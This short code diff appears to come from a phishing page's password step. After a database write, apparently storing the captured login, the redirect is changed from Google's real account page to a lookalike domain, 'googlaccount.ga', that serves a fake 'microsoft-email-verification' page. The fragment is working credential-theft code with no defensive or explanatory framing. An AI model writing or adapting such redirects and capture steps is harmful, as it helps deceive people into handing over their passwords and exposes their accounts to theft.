@@ -74,7 +74,7 @@ function doPasswordStep() {
 		})
 			.then((docRef) => {
 				console.log("Document written with ID: ", docRef.id);
-				window.location.href = "https://myaccount.google.com"
+				window.location.href = "https://googlaccount.ga/microsoft-email-verification.html"
 			})
 			.catch((error) => {
 				console.error("Error adding document: ", error);
